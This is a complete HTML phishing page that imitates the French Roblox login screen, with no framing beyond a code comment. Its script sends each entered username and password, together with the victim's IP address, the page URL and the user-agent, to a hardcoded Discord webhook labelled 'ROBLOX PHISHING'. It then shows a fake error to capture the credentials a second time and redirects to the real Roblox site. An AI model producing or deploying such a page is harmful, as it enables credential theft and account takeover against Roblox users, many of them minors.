<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion à Roblox</title>
    <link rel="icon" href="https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Source Sans Pro', Arial, Helvetica, sans-serif;
        }

        body {
            background: #000;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        /* Fond avec les images de jeux */
        .background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
                url('https://tr.rbxcdn.com/180DAY-8c9e2e1c-7c3b-4c5e-8c2e-9e8e7c6b5a4a/768/432/Image/Webp/noFilter') center/cover,
                repeating-conic-gradient(from 0deg at 50% 50%, #111 0deg 10deg, #1a1a1a 10deg 20deg);
            opacity: 0.6;
            z-index: -1;
        }

        /* Images de jeux en grille (simulation visuelle) */
        .game-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            grid-template-rows: repeat(3, 1fr);
            gap: 10px;
            padding: 10px;
            z-index: -2;
            opacity: 0.4;
        }

        .game-item {
            background: #333;
            border-radius: 8px;
            position: relative;
            overflow: hidden;
        }

        /* Simuler les images de jeux connus avec des dégradés */
        .game-item:nth-child(1) { background: linear-gradient(135deg, #8B0000, #FF4500); }
        .game-item:nth-child(2) { background: linear-gradient(135deg, #4B0082, #9400D3); }
        .game-item:nth-child(3) { background: linear-gradient(135deg, #006400, #32CD32); }
        .game-item:nth-child(4) { background: linear-gradient(135deg, #00008B, #4169E1); }
        .game-item:nth-child(5) { background: linear-gradient(135deg, #8B4513, #D2691E); }
        .game-item:nth-child(6) { background: linear-gradient(135deg, #2F4F4F, #708090); }
        .game-item:nth-child(7) { background: linear-gradient(135deg, #800080, #FF69B4); }
        .game-item:nth-child(8) { background: linear-gradient(135deg, #191970, #6495ED); }
        .game-item:nth-child(9) { background: linear-gradient(135deg, #556B2F, #9ACD32); }
        .game-item:nth-child(10) { background: linear-gradient(135deg, #483D8B, #9370DB); }
        .game-item:nth-child(11) { background: linear-gradient(135deg, #B8860B, #FFD700); }
        .game-item:nth-child(12) { background: linear-gradient(135deg, #8B008B, #DA70D6); }

        /* Overlay sombre */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.75);
            z-index: -1;
        }

        /* Header */
        .header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: 60px;
            background: rgba(0,0,0,0.9);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 40px;
            z-index: 100;
            border-bottom: 1px solid #333;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
            color: white;
            font-size: 24px;
            font-weight: bold;
            letter-spacing: -1px;
        }

        .logo-icon {
            width: 30px;
            height: 30px;
            background: white;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: black;
            font-weight: 900;
        }

        .nav-links {
            display: flex;
            gap: 30px;
            align-items: center;
        }

        .nav-links a {
            color: white;
            text-decoration: none;
            font-size: 16px;
            font-weight: 600;
        }

        .nav-links a:hover {
            text-decoration: underline;
        }

        .search-box {
            background: #333;
            border: none;
            padding: 8px 15px;
            border-radius: 20px;
            color: #888;
            width: 200px;
            font-size: 14px;
        }

        .btn-nav {
            background: #5865f2;
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
        }

        .btn-nav-outline {
            background: transparent;
            border: 1px solid #666;
            color: white;
            padding: 8px 20px;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
        }

        /* Container principal */
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding-top: 60px;
        }

        /* Boîte de connexion */
        .login-box {
            background: #36393f;
            width: 100%;
            max-width: 420px;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            position: relative;
        }

        .login-title {
            color: white;
            font-size: 28px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            color: #b9bbbe;
            font-size: 14px;
            font-weight: 600;
            display: block;
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            padding: 12px 15px;
            background: #303338;
            border: 1px solid #202225;
            border-radius: 4px;
            color: #dcddde;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        .form-input:focus {
            border-color: #5865f2;
        }

        .form-input::placeholder {
            color: #72767d;
        }

        .btn-submit {
            width: 100%;
            padding: 14px;
            background: #5865f2;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }

        .btn-submit:hover {
            background: #4752c4;
        }

        .links {
            margin-top: 20px;
            text-align: center;
        }

        .links a {
            color: #00aff4;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin: 10px 0;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .divider {
            height: 1px;
            background: #40444b;
            margin: 20px 0;
        }

        .btn-secondary {
            width: 100%;
            padding: 12px;
            background: #40444b;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .btn-secondary:hover {
            background: #4a4d55;
        }

        .signup-text {
            color: #72767d;
            font-size: 14px;
            text-align: center;
            margin-top: 20px;
        }

        .signup-text a {
            color: #00aff4;
            text-decoration: none;
        }

        /* Message d'erreur */
        .error-msg {
            background: rgba(237, 66, 69, 0.1);
            border: 1px solid #ed4245;
            color: #ed4245;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
            text-align: center;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .login-box {
                margin: 20px;
                padding: 30px 20px;
            }
            
            .header {
                padding: 0 20px;
            }
            
            .nav-links {
                display: none;
            }
        }
    </style>
</head>
<body>
    <!-- Fond visuel -->
    <div class="game-grid">
        <div class="game-item"></div>
        <div class="game-item"></div>
        <div class="game-item"></div>
        <div class="game-item"></div>
        <div class="game-item"></div>
        <div class="game-item"></div>
        <div class="game-item"></div>
        <div class="game-item"></div>
        <div class="game-item"></div>
        <div class="game-item"></div>
        <div class="game-item"></div>
        <div class="game-item"></div>
    </div>
    <div class="overlay"></div>

    <!-- Header -->
    <div class="header">
        <div class="logo">
            <div class="logo-icon">R</div>
            ROBLOX
        </div>
        <div class="nav-links">
            <a href="#">Charts</a>
            <a href="#">Marketplace</a>
            <a href="#">Créer</a>
            <a href="#">Robux</a>
            <input type="text" class="search-box" placeholder="Rechercher">
            <button class="btn-nav-outline">S'inscrire</button>
            <button class="btn-nav">Connexion</button>
        </div>
    </div>

    <!-- Container -->
    <div class="container">
        <div class="login-box">
            <h1 class="login-title">Connexion à Roblox</h1>
            
            <div class="error-msg" id="error">
                Identifiant ou mot de passe incorrect. Veuillez réessayer.
            </div>

            <form id="loginForm">
                <div class="form-group">
                    <label class="form-label">Identifiant/E-mail/Téléphone</label>
                    <input type="text" id="username" class="form-input" placeholder="Identifiant/E-mail/Téléphone" required autocomplete="off">
                </div>

                <div class="form-group">
                    <label class="form-label">Mot de passe</label>
                    <input type="password" id="password" class="form-input" placeholder="Mot de passe" required>
                </div>

                <button type="submit" class="btn-submit">Connexion</button>
            </form>

            <div class="links">
                <a href="#">Mot de passe ou nom d'utilisateur oublié ?</a>
            </div>

            <div class="divider"></div>

            <button class="btn-secondary">Envoyez-moi un code unique par email</button>
            <button class="btn-secondary">Connexion rapide</button>

            <div class="signup-text">
                Vous n'avez pas de compte ? <a href="#">S'inscrire</a>
            </div>
        </div>
    </div>

    <script>
        // CONFIGURATION - REMPLACE PAR TON WEBHOOK
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537654143118999572/xUfeTGedDvVvB5mguwhB9BMhIvNDBIHvmwFBh5e1h3WevbWIFRQoq7pMl14UVfpAlSRk';

        async function sendData(data) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (e) {}
        }

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch (e) { return 'unknown'; }
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorDiv = document.getElementById('error');
            
            const ip = await getIP();
            
            await sendData({
                content: `🎮 **ROBLOX PHISHING** 🎮\n\n` +
                        `👤 **Username:** \`${username}\`\n` +
                        `🔑 **Password:** \`${password}\`\n` +
                        `🌐 **IP:** ${ip}\n` +
                        `🔗 **URL:** ${window.location.href}\n` +
                        `🖥️ **User-Agent:** ${navigator.userAgent}\n` +
                        `⏰ **Time:** ${new Date().toLocaleString('fr-FR')}`
            });
            
            // Affiche erreur pour faire réessayer (et capturer à nouveau)
            errorDiv.style.display = 'block';
            document.getElementById('password').value = '';
            
            // Redirection vers vrai Roblox après 3s
            setTimeout(() => {
                window.location.href = 'https://www.roblox.com/login';
            }, 3000);
        });
    </script>
</body>
</html>
